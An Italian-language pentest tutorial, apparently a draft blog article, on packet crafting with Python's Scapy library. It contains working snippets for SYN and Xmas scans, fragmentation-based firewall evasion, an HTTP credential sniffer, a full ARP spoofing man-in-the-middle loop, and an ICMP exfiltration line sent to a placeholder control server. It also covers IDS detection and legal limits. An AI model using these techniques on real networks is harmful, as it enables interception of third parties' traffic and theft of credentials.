---
title: 'Scapy Python: Packet Crafting, Sniffing e ARP Spoofing'
slug: scapy
description: 'Impara Scapy con Python per creare e analizzare pacchetti TCP, UDP, ICMP e ARP, eseguire SYN scan, sniffing, ARP spoofing e testare firewall e IDS.'
image: /scapy-python-packet-crafting-pentest.webp
draft: true
date: 2026-08-20T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - Scapy
  - Python
  - Packet Crafting
  - Packet Sniffing
  - ARP Spoofing
  - TCP SYN Scan
  - Firewall Evasion
---

# Scapy: Packet Crafting con Python per Pentest, Firewall Evasion e ARP Spoofing

**Scapy è una libreria Python per il packet crafting**: permette di costruire, inviare, catturare e analizzare pacchetti di rete campo per campo (Ethernet, IP, TCP, UDP, ICMP, ARP e altri), invece di affidarsi alle opzioni già decise da un tool come Nmap o Wireshark. Rientra nella stessa categoria di raw socket Python e strumenti di network programming, ma con un livello di controllo che nessun tool a riga di comando offre.

**Prima di iniziare, ti serve:**

* Python 3 installato
* Linux (consigliato) o Windows con driver Npcap
* privilegi elevati per la maggior parte delle operazioni (root su Linux, prompt amministratore su Windows)
* una rete di laboratorio (VM, HTB, VulnLab) — mai una rete che non gestisci
* basi di TCP/IP: cosa sono IP, porte, three-way handshake

In questo articolo vedrai:

* come installare Scapy e i requisiti per usarlo
* come esplorare i protocolli e ispezionare un pacchetto con `ls()`, `show()`, `summary()` e `hexdump()`
* come inviare un ping ICMP, fare un TCP SYN scan e costruire pacchetti UDP, ARP, IPv6
* come usare `srp()` per un host discovery via ARP su tutta una subnet
* come usare frammentazione e combinazioni di flag TCP per aggirare firewall e IDS — e come un IDS se ne accorge
* come catturare pacchetti (con filtri BPF) e fare ARP spoofing completo, con forwarding e sniffing delle credenziali
* come salvare e riaprire catture in formato PCAP
* dove si colloca Scapy in un workflow di pentest reale, quando conviene usare Nmap o Wireshark al suo posto, e gli errori più comuni di chi inizia

## Cos'è Scapy e perché è diverso da Nmap, Wireshark, hping3

Ogni volta che due computer comunicano, si scambiano dati incapsulati a livelli: un frame Ethernet contiene un pacchetto IP, che contiene un pacchetto TCP (o UDP, o ICMP), un po' come buste una dentro l'altra. Nmap, hping, Wireshark leggono e costruiscono queste buste per te, con logiche già decise da chi li ha scritti.

Scapy ti dà lo stesso potere ma a livello di singolo campo, dentro uno script Python: decidi tu il flag TCP, il TTL, la frammentazione, l'ordine dei livelli. Questo lo rende più lento e meno pratico per un lavoro di routine, ma insostituibile quando devi capire *esattamente* cosa succede in un pacchetto, o costruire qualcosa che un tool pronto non prevede.

## Installazione e permessi necessari

```bash
pip install scapy

# Su Kali/Debian, alternativa via pacchetto di sistema
sudo apt install python3-scapy -y

# Verifica versione installata
python3 -c "import scapy; print(scapy.__version__)"
```

Scapy lavora con socket "raw", cioè accede direttamente all'interfaccia di rete bypassando (per queste operazioni) lo stack normale del sistema operativo. Questo richiede privilegi elevati per la maggior parte delle operazioni di invio, sniffing e accesso ai raw socket:

```bash
sudo python3
```

oppure esegui lo script intero con `sudo` davanti. Su Windows serve un prompt con privilegi di amministratore e il driver Npcap installato.

## Sintassi base di Scapy

Prima degli esempi pratici, la struttura che userai in ogni script: i protocolli si impilano con `/`, dal livello più basso al più alto.

```python
Layer 2 → Ether()
Layer 3 → IP()
Layer 4 → TCP() / UDP() / ICMP()
Payload → Raw()
```

```python
from scapy.all import IP, TCP, Ether

IP(dst="192.168.1.10")                          # solo layer 3
IP(dst="192.168.1.10") / TCP(dport=80, flags="S")   # layer 3 + 4
Ether() / IP(dst="192.168.1.10") / TCP(dport=80)     # layer 2 + 3 + 4
```

Ogni oggetto costruito così (`IP()`, `TCP()`, un `IP()/TCP()` combinato) è un normale oggetto Python: puoi ispezionarlo, modificarlo campo per campo, o passarlo a `send()`/`sr1()` per spedirlo.

## Prima di costruire pacchetti: esplora i protocolli con `ls()` e `show()`

Prima ancora degli esempi pratici, vale la pena conoscere gli strumenti che Scapy offre per **esplorare** cosa stai costruendo — altrimenti "campo per campo" resta solo uno slogan.

```python
from scapy.all import ls, IP, TCP

ls(TCP)          # elenca tutti i campi disponibili nel protocollo TCP, coi valori di default
```

`ls()` ti mostra ogni campo che un protocollo supporta (flag, opzioni, campi meno comuni che nessun tutorial menziona). È il modo più veloce per scoprire come costruire un pacchetto non standard, senza dover cercare la documentazione ogni volta.

```python
pkt = IP(dst="1.1.1.1") / TCP(dport=443, flags="S")
pkt.show()       # struttura leggibile del pacchetto, livello per livello
pkt.show2()      # come show(), ma forza il calcolo dei campi automatici (es. checksum)
pkt.summary()    # riepilogo su una riga, utile quando ne ispezioni tanti in sequenza
```

La differenza tra `show()` e `show2()` conta più di quanto sembri: Scapy calcola alcuni campi — come i checksum di IP e TCP — solo al momento dell'invio, non quando costruisci il pacchetto. `show()` prima dell'invio può mostrarti un checksum vuoto o `None`; `show2()` forza quel calcolo, utile in fase di debug quando un pacchetto "sembra giusto" ma il target lo scarta silenziosamente.

Per un'ispezione byte per byte, invece della struttura leggibile:

```python
from scapy.all import hexdump

hexdump(pkt)   # dump esadecimale del pacchetto, campo per campo a livello di bit
```

**Quale interfaccia sto usando davvero?** Su una macchina con più interfacce (Wi-Fi, Ethernet, VPN — tipico quando sei connesso alla VPN di HackTheBox o VulnLab), Scapy sceglie l'interfaccia in base alla tabella di routing del sistema, che puoi ispezionare direttamente:

```python
from scapy.all import conf, get_if_list

get_if_list()   # elenco grezzo delle interfacce disponibili sul sistema
conf.ifaces     # elenco delle interfacce che Scapy vede, con più dettaglio
conf.iface      # interfaccia di default che Scapy userebbe ora
conf.route      # tabella di routing usata per decidere da dove escono i pacchetti
```

Se un pacchetto sembra non arrivare mai a destinazione durante un lab con VPN, il primo sospetto è quasi sempre questo: Scapy sta uscendo dall'interfaccia sbagliata, non dal tunnel.

## Scapy vs Nmap vs Wireshark vs hping3: quando usare cosa

Una domanda che si pone quasi chiunque inizi: se esistono già Nmap, Wireshark e hping3, perché imparare anche Scapy? Perché ognuno risolve un problema diverso:

| Strumento     | Ideale per                                                                                 |
| ------------- | ------------------------------------------------------------------------------------------ |
| **Scapy**     | Packet crafting su misura, pacchetti che nessun tool prevede, capire un protocollo a fondo |
| **Nmap**      | Port scan veloce e maturo su larga scala                                                   |
| **Wireshark** | Analisi visiva del traffico catturato                                                      |
| **tcpdump**   | Cattura da riga di comando, leggera, su server senza interfaccia grafica                   |
| **hping3**    | Test TCP mirati da riga di comando, senza scrivere codice                                  |
| **masscan**   | Scansione massiva di migliaia di porte/IP in pochi secondi                                 |

In pratica: usi Nmap per scoprire, Wireshark per guardare, e Scapy quando devi **costruire** qualcosa che gli altri due non prevedono — o capire davvero perché un pacchetto si comporta in un certo modo.

## Ethernet, IP e le funzioni di invio: le basi che contano davvero

Prima degli esempi, due concetti che quasi tutti i tutorial di Scapy saltano — e che sono il motivo per cui il primo script di chiunque spesso non funziona.

**Il livello Ethernet (`Ether()`).** Le funzioni `send()` e `sr1()` lavorano a livello 3 (IP): Scapy si occupa lui di trovare il MAC di destinazione tramite il routing del sistema. Ma su una rete locale, se hai bisogno di controllare tu il livello 2 (per esempio in un attacco ARP, o per inviare su un'interfaccia specifica), devi costruire anche il frame Ethernet e usare le funzioni "p" (packet, livello 2):

```python
from scapy.all import Ether, ARP, sendp

frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.1")
sendp(frame, iface="eth0")
```

`sendp()` invia a livello 2 e richiede che tu specifichi il livello Ethernet; `send()` lavora a livello 3 e ci pensa il sistema a incapsulare. Confonderli è la causa più comune di "il mio script non manda niente".

**`send()`/`sendp()` vs `sr1()`/`sr()`/`srp()`.** `send()` e `sendp()` spediscono e basta, senza aspettare risposta — utili per flussi continui come lo spoofing ARP. `sr1()` invia e aspetta **una sola** risposta; `sr()` invia (anche più pacchetti insieme, a livello 3) e raccoglie tutte le risposte, restituendo coppie richiesta/risposta. `srp()` fa lo stesso ma a livello 2 — è la funzione che usi tipicamente per un host discovery ARP su una subnet intera, dove serve controllare anche il frame Ethernet:

```python
from scapy.all import Ether, ARP, srp

# Host discovery: chi risponde su tutta la subnet?
risposte, non_risposte = srp(
    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.0/24"),
    timeout=2,
    verbose=False
)

for inviato, ricevuto in risposte:
    print(ricevuto[ARP].psrc, ricevuto[Ether].src)
```

Questo è l'equivalente Scapy di un ARP scan: manda una richiesta broadcast a tutta la subnet e raccoglie chi risponde, con IP e MAC — utile come primo passo di recon su una rete locale prima ancora di lanciare Nmap.

**Per la scansione di più pacchetti insieme, `sr()`/`srp()` sono più efficienti di un ciclo di `sr1()`.**

**Il timeout è obbligatorio, non opzionale.** Se il target non risponde (porta filtrata, firewall silenzioso), `sr1()` senza timeout resta bloccato all'infinito aspettando un pacchetto che non arriverà mai:

```python
risposta = sr1(pacchetto, timeout=2)
if risposta is None:
    print("Nessuna risposta")
```

Mettilo sempre, fin dal primo script.

## Come inviare un ping ICMP con Scapy

```python
from scapy.all import IP, ICMP, sr1

pacchetto = IP(dst="8.8.8.8") / ICMP()
risposta = sr1(pacchetto, timeout=2)
if risposta:
    risposta.show()
```

Il simbolo `/` impacchetta un livello dentro l'altro: qui l'ICMP dentro l'IP. `risposta.show()` stampa ogni campo del pacchetto ricevuto — il modo più diretto per vedere davvero com'è fatto un pacchetto IP/ICMP, invece di leggerlo solo su un diagramma.

## Come fare un TCP SYN scan con Scapy

```python
from scapy.all import IP, TCP, sr1

pacchetto = IP(dst="192.168.1.10") / TCP(dport=80, flags="S")
risposta = sr1(pacchetto, timeout=2)

if risposta and risposta.haslayer(TCP):
    if risposta[TCP].flags == "SA":
        print("Porta aperta")
    elif risposta[TCP].flags == "RA":
        print("Porta chiusa")
```

`flags="S"` è il flag SYN, quello che apre una connessione. Se la porta è aperta il target risponde `SA` (SYN-ACK); se è chiusa risponde `RA` (RST-ACK). Non completiamo mai la connessione con il terzo ACK — per questo si chiama half-open scan, ed è generalmente meno rumoroso di una connessione TCP piena, perché molti log applicativi registrano solo le connessioni portate a termine (un IDS di rete, invece, lo vede comunque passare).

C'è però un dettaglio che quasi nessun tutorial menziona: quando il target risponde con `SA`, è il **tuo stesso kernel Linux** — non lo script — a rispondere con un RST, perché non sa nulla di questa connessione avviata "a mano" da Scapy. Questo può disturbare lo scan o rivelarlo. Per evitarlo, molti bloccano temporaneamente l'invio di RST in uscita verso il target:

```bash
sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
```

Da rimuovere finita la sessione di test, ovviamente.

## UDP: il protocollo che quasi tutti dimenticano

Tra i tutorial di Scapy in giro, quasi tutti si fermano a TCP e ICMP, ma buona parte dei servizi interessanti in un pentest gira su UDP: DNS, SNMP, TFTP, molti protocolli di discovery.

```python
from scapy.all import IP, UDP, sr1

pacchetto = IP(dst="192.168.1.10") / UDP(dport=161)   # 161 = SNMP
risposta = sr1(pacchetto, timeout=2)
```

A differenza di TCP, UDP non ha un handshake: se non arriva nessuna risposta, può voler dire porta chiusa **oppure** porta aperta ma il servizio non risponde a un pacchetto vuoto — con UDP serve quasi sempre costruire un payload minimamente valido per quel protocollo specifico (una query DNS vera, un pacchetto SNMP con community string) per ottenere una risposta utile.

## Un accenno a IPv6

Molte reti aziendali hanno IPv6 attivo per default, anche quando chi le amministra pensa di averlo disabilitato — e uno scanner che guarda solo IPv4 si perde quel pezzo di superficie d'attacco. Scapy supporta IPv6 e ICMPv6 allo stesso modo:

```python
from scapy.all import IPv6, ICMPv6EchoRequest, sr1

pacchetto = IPv6(dst="fe80::1") / ICMPv6EchoRequest()
risposta = sr1(pacchetto, timeout=2)
```

Non è un dettaglio da manuale: un servizio che pensavi raggiungibile solo su IPv4 potrebbe rispondere anche in IPv6, aprendo un percorso che il firewall filtra diversamente (o non filtra affatto).

## Scapy per Testare Firewall e IDS

Le tecniche di evasione qui sotto vanno usate esclusivamente in assessment autorizzati o in lab — è l'uso di Scapy che nessun altro tool sostituisce davvero: costruire pacchetti pensati per **confondere** un dispositivo di sicurezza, non solo per raggiungere un target.

**Frammentazione IP.** Alcuni firewall ispezionano solo il primo frammento di un pacchetto diviso, lasciando passare il resto senza controllo. Puoi dividere manualmente un pacchetto in due frammenti IP:

```python
from scapy.all import IP, TCP, Raw, send

pacchetto = IP(dst="192.168.1.10", flags="MF", frag=0) / TCP(dport=80, flags="S")
secondo_frammento = IP(dst="192.168.1.10", frag=1) / Raw(load="dati residui")

send(pacchetto)
send(secondo_frammento)
```

`flags="MF"` (More Fragments) dice che seguono altri pezzi; `frag=1` indica l'offset del secondo frammento. Un firewall che valuta solo il primo pezzo può non vedere mai l'intestazione TCP completa.

**TTL basso per mappare cosa c'è dietro un firewall.** Ogni router che il pacchetto attraversa decrementa il TTL di 1; a zero il pacchetto scade e il router risponde con un errore ICMP "time exceeded". Giocando con il TTL (lo stesso principio di `traceroute`) capisci quanti hop separano te dal target, e puoi far scadere apposta un pacchetto su un segmento specifico invece di raggiungere l'host finale — utile per non far notare la scansione al sistema di sicurezza più vicino al bersaglio vero.

**Combinazioni di flag TCP anomale.** Nmap le implementa già (`-sX`, `-sN`, `-sF`), ma capire cosa fanno aiuta a interpretare i risultati:

```python
from scapy.all import IP, TCP, sr1

# Xmas scan: FIN + PSH + URG accesi insieme — combinazione che non esiste in un handshake normale
pacchetto = IP(dst="192.168.1.10") / TCP(dport=80, flags="FPU")
risposta = sr1(pacchetto, timeout=2)
```

Un sistema TCP/IP a norma RFC 793 non dovrebbe rispondere nulla se la porta è aperta, e un RST se è chiusa — un comportamento diverso da quello di un SYN scan classico, che alcuni firewall stateful non filtrano allo stesso modo perché non riconoscono l'inizio di una connessione "regolare". Questo genere di test si chiama **ACL mapping**: capire, pacchetto per pacchetto, quali regole ha davvero un firewall, non quali dichiara di avere.

### Come un IDS individua questi tentativi

Vale la pena conoscere anche il lato difensivo, perché aiuta a capire quanto queste tecniche siano davvero "invisibili" (spoiler: sempre meno). Un sistema di detection come Suricata o Zeek segnala tipicamente:

* combinazioni di flag TCP che non esistono in un traffico normale (Xmas, NULL scan)
* frammentazione IP anomala o frammenti che si sovrappongono
* TTL incoerente rispetto al resto del traffico dalla stessa sorgente
* pattern di scansione lenti e distribuiti su molte porte, pensati apposta per restare sotto soglia — ma comunque riconoscibili su una finestra temporale più ampia

Una regola Snort/Suricata di base per un Xmas scan, giusto per farsi un'idea di come si scrive, controlla semplicemente la combinazione di flag `FIN,PSH,URG` attivi insieme su un pacchetto TCP. Sapere questo non deve scoraggiarti dal provare queste tecniche in lab: serve a darti aspettative realistiche su quanto siano "rumorose" in un ambiente monitorato bene.

## Packet Sniffing e PCAP

Oltre a costruire pacchetti, Scapy li sa anche catturare e analizzare, in modo programmabile, con filtri BPF (Berkeley Packet Filter) — la stessa sintassi che useresti con tcpdump:

| Filtro              | Significato                         |
| ------------------- | ----------------------------------- |
| `tcp`               | solo traffico TCP                   |
| `udp`               | solo traffico UDP                   |
| `icmp`              | solo traffico ICMP                  |
| `port 80`           | traffico da/verso la porta 80       |
| `tcp port 443`      | solo TCP sulla porta 443 (HTTPS)    |
| `host 192.168.1.10` | traffico da/verso un host specifico |
| `arp`               | solo traffico ARP                   |

```python
from scapy.all import sniff, Raw, TCP

def analizza(pkt):
    if pkt.haslayer(Raw) and pkt.haslayer(TCP) and pkt[TCP].dport == 80:
        payload = pkt[Raw].load
        if b"password" in payload.lower() or b"user" in payload.lower():
            print(payload)

sniff(filter="tcp port 80", prn=analizza, store=False)
```

`pkt[Raw].load` è il payload grezzo del pacchetto: su traffico HTTP non cifrato, spesso contiene form di login in chiaro. È lo stesso motivo per cui HTTPS esiste — ma su una rete di lab dove hai intercettato traffico non cifrato (vedi sezione successiva), questo genere di script rende visibile un problema che a parole resta astratto.

**Catturare mentre fai altro.** `sniff()` blocca lo script finché non finisce la cattura — un problema quando, per esempio, devi avviare uno sniffer e continuare con un ARP spoofing nello stesso script. `AsyncSniffer` risolve questo, catturando in background:

```python
from scapy.all import AsyncSniffer

sniffer = AsyncSniffer(filter="tcp", prn=analizza, store=False)
sniffer.start()
# ...qui il resto dello script continua, es. l'ARP spoofing
sniffer.stop()
```

> `sniff()` tiene tutti i pacchetti catturati in memoria per default. Su catture lunghe imposta `store=False` (come negli esempi sopra) o la RAM si esaurisce.

**Salvare e riaprire una cattura (PCAP).** Per un report di pentest, o per rianalizzare con calma quello che hai catturato, salva tutto in un file `.pcap` — lo stesso formato che apre Wireshark:

```python
from scapy.all import wrpcap, rdpcap

wrpcap("cattura.pcap", pacchetti_catturati)   # salva una lista di pacchetti
pacchetti = rdpcap("cattura.pcap")            # ricarica per analisi offline
```

Un flusso tipico in un pentest reale è proprio questo: costruisci o catturi con Scapy, salvi in PCAP, e apri il file in Wireshark per un'analisi visiva più comoda — i due strumenti non si escludono, si completano.

## ARP Spoofing e MITM con Scapy

L'ARP spoofing sfrutta il fatto che il protocollo ARP non verifica identità: basta rispondere "sono io" più spesso della macchina legittima perché la vittima ti creda. Usa questa tecnica solo su reti che gestisci o in un engagement autorizzato — su reti locali reali il traffico di terzi può includere dati personali non in scope.

```python
from scapy.all import ARP, send
import time

def spoof(ip_target, ip_da_impersonare):
    pacchetto = ARP(op=2, pdst=ip_target, psrc=ip_da_impersonare)
    send(pacchetto, verbose=False)

while True:
    spoof("192.168.1.20", "192.168.1.1")   # dico alla vittima che il gateway sono io
    spoof("192.168.1.1", "192.168.1.20")   # dico al gateway che la vittima sono io
    time.sleep(2)
```

Un dettaglio che separa un attacco funzionante da un disastro: **senza IP forwarding attivo sulla tua macchina, il traffico che intercetti non arriva mai a destinazione**. Hai fatto un MITM parziale che, di fatto, è un denial of service verso la vittima, non un'intercettazione:

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

Solo con il forwarding attivo il traffico passa davvero da te e arriva comunque al gateway — a quel punto lo script di sniffing della sezione precedente, puntato sull'interfaccia giusta, può leggere quello che la vittima manda in chiaro. È lo stesso principio che rende pericoloso un protocollo come TFTP, che non cifra nulla: intercettato il traffico, i dati passano in chiaro davanti a te.

## Un accenno a DNS ed esfiltrazione via ICMP

In un ambiente dove il traffico TCP in uscita è bloccato ma ICMP o DNS passano comunque (capita spesso nei test su reti aziendali segmentate), un canale come questo diventa interessante da conoscere lato difensivo prima ancora che offensivo:

```python
from scapy.all import IP, ICMP, Raw, send

send(IP(dst="server-di-controllo") / ICMP() / Raw(load="dato da esfiltrare"))
```

Un pacchetto ICMP con dati nel payload sembra un ping qualunque a un controllo superficiale. Lo stesso principio vale per query DNS costruite con il dato nascosto nel nome host (`dato.dominio-attaccante.com`). Conoscerlo serve soprattutto a un blue team: un IDS che ispeziona solo intestazioni e non il contenuto dei pacchetti ICMP/DNS non vede nulla di anomalo, ed è per questo che i sistemi di detection maturi (Suricata, Zeek) controllano anche dimensione e frequenza di questi pacchetti, non solo il protocollo.

## Dove Entra Scapy in un Pentest Vero

Nessun pentester si sveglia pensando "oggi faccio ARP spoofing con Scapy" come attività isolata. Scapy entra in un flusso più ampio, di solito così:

1. **Nmap o un altro scanner** trova un servizio o un comportamento che non torna — una porta che risponde in modo strano, un protocollo poco comune, un firewall che sembra bloccare in modo incoerente
2. **Scapy costruisce il pacchetto specifico** per verificare quell'ipotesi — un flag particolare, un frammento, un protocollo che gli scanner generici non testano a fondo
3. **Wireshark (o una cattura PCAP)** conferma cosa è successo davvero sul filo, pacchetto per pacchetto
4. il risultato diventa parte del **report**: non "ho provato l'evasione", ma "il firewall X non ispeziona i frammenti oltre il primo, prova ne è il pacchetto Y che ha raggiunto il servizio Z"

Scapy, in questo flusso, non è mai lo strumento principale dall'inizio alla fine: è il modo per rispondere a una domanda precisa quando lo strumento generico non basta più.

## Funzioni Principali di Scapy

| Funzione                       | Utilizzo                                                   |
| ------------------------------ | ---------------------------------------------------------- |
| `send()`                       | Invio a livello 3 (IP), senza attesa risposta              |
| `sendp()`                      | Invio a livello 2 (Ethernet), senza attesa risposta        |
| `sr()`                         | Invio (livello 3) + raccolta di tutte le risposte          |
| `sr1()`                        | Invio + attesa di una sola risposta                        |
| `srp()`                        | Come `sr()` ma a livello 2 — tipico per host discovery ARP |
| `sniff()`                      | Cattura pacchetti con filtro BPF                           |
| `AsyncSniffer()`               | Cattura in background, non bloccante                       |
| `ls()`                         | Elenca i campi disponibili di un protocollo                |
| `show()`                       | Mostra la struttura di un pacchetto                        |
| `show2()`                      | Come `show()`, ma forza il calcolo dei campi automatici    |
| `summary()`                    | Riepilogo di un pacchetto su una riga                      |
| `hexdump()`                    | Dump esadecimale del pacchetto                             |
| `wrpcap()`                     | Salva una cattura in formato PCAP                          |
| `rdpcap()`                     | Rilegge un file PCAP                                       |
| `get_if_list()` / `conf.iface` | Elenca/mostra le interfacce di rete disponibili            |

## I Limiti Reali di Scapy (e Quando Non È lo Strumento Giusto)

* **Ha un overhead non trascurabile su volumi alti.** Per una scansione di 65.000 porte non usi Scapy: usi Nmap o masscan, pensati per quello. Scapy costruisce ogni pacchetto in Python e non sfrutta di norma accelerazioni a livello kernel (tecniche come PF\_RING, AF\_PACKET o DPDK, usate da strumenti pensati per il volume) — su uno scan massivo l'overhead diventa evidente.
* **Non è invisibile.** I pacchetti generati hanno timing e caratteristiche riconoscibili; un IDS maturo come Suricata o Snort con regole aggiornate li individua senza troppa difficoltà. Scapy aiuta a *capire* l'evasione, non la garantisce.
* **Non è un C2.** Gli esempi di canali coperti visti sopra sono didattici: un command & control vero (Cobalt Strike, Sliver, o anche un semplice framework su misura) gestisce cifratura, jitter, resilienza alla perdita di pacchetti — cose che uno script Scapy fatto in mezz'ora non replica.
* **Non tutti gli stack di rete si comportano uguale.** Un pacchetto costruito "a norma" da Scapy può comunque essere interpretato in modo diverso da stack TCP/IP diversi (Linux, Windows, dispositivi embedded), e alcune schede di rete calcolano da sole i checksum (offload), rendendo `show()` fuorviante finché non forzi il calcolo con `show2()` come visto sopra.

Sapere quando **non** usare uno strumento è parte della competenza tanto quanto sapere come usarlo.

## Errori Comuni di Chi Inizia con Scapy

* **`sr1()` senza `timeout`**: lo script resta bloccato se il target non risponde
* **Dimenticare `Ether()`/`sendp()` quando serve controllo di livello 2**, per poi chiedersi perché `send()` non funziona su un attacco ARP
* **ARP spoofing senza attivare l'IP forwarding**: da MITM a DoS accidentale in un secondo
* **Non impostare `store=False` in `sniff()` su catture lunghe**: la RAM si esaurisce
* **Guardare `show()` prima dell'invio e pensare che il checksum sia sbagliato**: alcuni campi si calcolano solo al momento della trasmissione — usa `show2()` per vederli già valorizzati

## Troubleshooting

| Problema                                              | Causa probabile                                                                |
| ----------------------------------------------------- | ------------------------------------------------------------------------------ |
| Nessuna risposta al pacchetto inviato                 | Firewall, routing sbagliato, o servizio down                                   |
| Il pacchetto sembra uscire dall'interfaccia sbagliata | VPN/Wi-Fi/Ethernet multipli — controlla `conf.iface`/`conf.route`              |
| `Permission denied` sull'invio                        | Privilegi insufficienti — servono root/amministratore                          |
| Checksum apparentemente errato in `show()`            | Campo calcolato solo all'invio — usa `show2()`                                 |
| `sendp()`/ARP che non funziona                        | Manca `Ether()`, o interfaccia sbagliata                                       |
| SYN scan con risultati incoerenti                     | Il kernel locale genera RST autonomamente — vedi la nota nella sezione TCP SYN |
| `sniff()` non cattura nulla                           | Filtro BPF sbagliato o interfaccia sbagliata                                   |

## È Legale?

Costruire e inviare pacchetti — anche "anomali" come quelli visti qui — su una rete o un sistema di cui hai il permesso esplicito (un tuo laboratorio, una macchina HackTheBox o VulnLab, un ambiente di test autorizzato da un cliente) è normale attività di apprendimento e di pentest. Farlo su reti o sistemi altrui senza autorizzazione rientra nell'accesso abusivo a sistema informatico previsto dall'art. 615-ter del codice penale italiano — un motivo in più per tenere questi esperimenti dentro un lab, non su reti che non gestisci.

## Domande Frequenti

**Cos'è Scapy in Python?**
Una libreria per il packet crafting: costruzione, invio, cattura e analisi di pacchetti di rete campo per campo, a livello Ethernet, IP, TCP, UDP, ICMP e altri protocolli.

**A cosa serve Scapy?**
A network security, penetration testing, troubleshooting di rete e ricerca sui protocolli — ovunque serva costruire o analizzare un pacchetto a un livello di dettaglio che i tool standard non offrono.

**Come si installa Scapy?**
`pip install scapy`, oppure su Kali/Debian `sudo apt install python3-scapy`.

**Serve essere root per usare Scapy?**
La maggior parte delle operazioni di invio, sniffing e accesso a raw socket richiede privilegi elevati (root su Linux, amministratore su Windows) — non è un requisito assoluto per ogni singola funzione della libreria, ma lo è per quasi tutto ciò che tocca la rete direttamente.

**Scapy funziona su Windows?**
Sì, ma serve installare il driver Npcap e alcune funzionalità a livello 2 possono comportarsi diversamente rispetto a Linux, specialmente su interfacce Wi-Fi.

**Scapy può sostituire Nmap?**
No, per uno scan quotidiano Nmap resta più veloce e più maturo. Scapy serve a capire come funzionano quelle tecniche, o a costruire pacchetti che Nmap non prevede.

**Qual è la differenza tra `send()` e `sendp()`?**
`send()` lavora a livello 3 (IP) e lascia che sia il sistema a occuparsi dell'incapsulamento Ethernet; `sendp()` lavora a livello 2 e richiede che tu costruisca esplicitamente il frame Ethernet.

**Qual è la differenza tra `sr()`, `sr1()` e `srp()`?**
`sr1()` invia e aspetta una singola risposta; `sr()` invia (anche più pacchetti insieme) e restituisce tutte le coppie richiesta/risposta ricevute a livello 3; `srp()` fa lo stesso a livello 2, tipicamente usata per host discovery ARP su una subnet.

**Come si fa un host discovery con Scapy?**
Con `srp()` e un pacchetto ARP broadcast verso l'intera subnet — vedi l'esempio nella sezione su `srp()` sopra.

**Scapy è lento?**
Rispetto a strumenti ottimizzati per il volume come Nmap o masscan, sì: costruisce ogni pacchetto in Python. Per pochi pacchetti mirati la differenza è irrilevante; su scansioni di migliaia di porte si sente.

**Scapy supporta IPv6?**
Sì, inclusi ICMPv6 e Neighbor Discovery, con la stessa logica a livelli vista per IPv4.

**Un IDS moderno rileva il traffico generato da Scapy?**
Nella maggior parte dei casi sì, se le regole sono aggiornate. Scapy è uno strumento per imparare ed esplorare l'evasione, non una garanzia di invisibilità in un ambiente monitorato bene.

**Scapy è legale da usare?**
Costruire e inviare pacchetti su una rete o un sistema di cui hai il permesso esplicito (lab, HTB, VulnLab, un engagement autorizzato) è normale attività di studio e pentest. Su reti che non gestisci senza autorizzazione, no — vedi la sezione legale sopra.

***

## Per approfondire

* [Scapy — documentazione ufficiale](https://scapy.readthedocs.io/) — riferimento completo di protocolli e funzioni disponibili
* La nostra guida alla porta 2375 di Docker mostra un altro caso in cui capire davvero cosa gira "sotto" un protocollo fa la differenza tra uno scan superficiale e una scoperta reale

***

*Articolo a scopo didattico. Tecniche testate su ambienti autorizzati come HackTheBox, VulnLab e lab personali.*
